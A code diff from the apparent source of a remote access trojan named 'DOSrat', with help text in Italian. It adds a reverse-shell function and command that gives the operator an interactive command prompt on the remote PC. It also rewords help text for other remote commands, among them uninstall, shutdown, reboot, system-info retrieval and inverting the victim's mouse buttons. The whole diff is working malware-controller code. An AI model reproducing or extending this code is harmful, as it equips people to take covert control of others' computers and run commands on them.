@@ -523,6 +523,38 @@ bool RestartClient(SOCKET Sock, int ID)
     return false;
 }
 
+bool ReverseShell(SOCKET Sock)
+{
+	string Res = "";
+	string Cmd = "";
+	string Path = "";
+	
+    if (COMUNICAZIONI::ReverseShell(Sock, "reverseshell") == "OK")
+    {
+		while (true)
+		{
+			Path = COMUNICAZIONI::ReverseShell(Sock, "Get cd");
+			
+			if (Path == "")
+				return false;
+			
+			cout << Path << ">";
+			getline(cin, Cmd);
+			
+			Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
+			
+			if (Res == "")
+				return false;
+			else if (Res == "Reverse shell closed")
+				return true;
+			
+			cout << Res;
+		}
+    }
+
+    return false;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -546,18 +578,19 @@ void Sessione(int ID, SOCKET Sock)
         {
             cout << endl;
             cli.SubTitle("Client", 20, tc.Blue);
-            StampaHelp("Reconnect\t\t", "- Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo.");
+            StampaHelp("Reconnect\t\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
             StampaHelp("Killclient / Kill\t", "- Termina il processo del Client.");
-            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto.");
-            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal computer remoto.");
-            StampaHelp("Restartclient / Restart\t", "- Riavvia il Client terminando il processo e riavviandolo.");
+            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client con un eseguibile locale.");
+            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal PC remoto.");
+            StampaHelp("Restartclient / Restart\t", "- Termina il Client e lo riavvia.");
             cout << endl;
 
             cli.SubTitle("System", 20, tc.Lime);
-            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul computer remoto e sul Client.");
-            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse sul computer remoto.");
-            StampaHelp("Shutdown\t", "- Spegne il computer remoto.");
-            StampaHelp("Reboot\t\t", "- Riavvia il computer remoto.");
+            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
+            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
+            StampaHelp("Shutdown\t", "- Spegne il PC.");
+            StampaHelp("Reboot\t\t", "- Riavvia il PC.");
+			StampaHelp("Reverseshell / Revshell\t", "- Ottieni accesso alla console dei comandi del PC.");
             cout << endl;
 
             cli.SubTitle("Utility", 20, tc.Purple);
@@ -636,6 +669,11 @@ void Sessione(int ID, SOCKET Sock)
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
+        }
+		else if (cmd == "reverseshell" || cmd == "revshell")
+        {
+            if (!ReverseShell(Sock))
+                Controllo = CheckConnection(Sock, ID);
         }
         else
         {
